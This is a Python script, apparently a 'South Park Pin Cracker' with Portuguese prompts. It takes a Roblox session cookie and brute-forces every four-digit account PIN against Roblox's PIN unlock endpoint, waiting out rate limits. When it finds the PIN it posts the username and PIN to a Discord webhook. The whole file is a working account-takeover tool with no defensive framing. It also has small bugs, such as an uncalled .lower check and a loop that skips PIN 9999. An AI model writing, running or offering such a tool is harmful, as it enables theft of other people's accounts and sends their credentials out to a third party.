import requests
import re
import string
import time
import os

pingEveryone = True

print('''
   █████████                       █████    █████         ███████████                      █████     
 ███░░░░░███                     ░░███    ░░███         ░░███░░░░░███                    ░░███      
░███    ░░░   ██████  █████ ████ ███████   ░███████      ░███    ░███  ██████   ████████  ░███ █████
░░█████████  ███░░███░░███ ░███ ░░░███░    ░███░░███     ░██████████  ░░░░░███ ░░███░░███ ░███░░███ 
 ░░░░░░░░███░███ ░███ ░███ ░███   ░███     ░███ ░███     ░███░░░░░░    ███████  ░███ ░░░  ░██████░  
 ███    ░███░███ ░███ ░███ ░███   ░███ ███ ░███ ░███     ░███         ███░░███  ░███      ░███░░███ 
░░█████████ ░░██████  ░░████████  ░░█████  ████ █████    █████       ░░████████ █████     ████ █████
 ░░░░░░░░░   ░░░░░░    ░░░░░░░░    ░░░░░  ░░░░ ░░░░░    ░░░░░         ░░░░░░░░ ░░░░░     ░░░░ ░░░░░ 
                                                                                                    
                                                                                                    \n\n''')
print('')
print('Coloque seu cookie:')
cookie = input()

print('')
print('Coloque a webhook:')
webhook = input()

print('')
print('Aperte Enter para começar o programa!')
pingEveryone = input()

if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'


print (' South Park Pin Cracker . . . ')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Achado! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "South Park Pin Cracker"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Muitas requisicoes!' in r.text:
                
            print('  Tempo esgotado, tentando novamente em 30 segundos..')
            time.sleep(30)
                
        elif 'Authorization' in r.text:
                
            print('  Confira seu cookie!  ')  
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tentei o pin: {pin} , e foi Incorreto!")
            time.sleep(10)  
    except:
        print('  Erro Interno, estamos corrigindo isto!')
    
input('\n  Aperte qualquer tecla para sair')
        


        



    
        
            
        



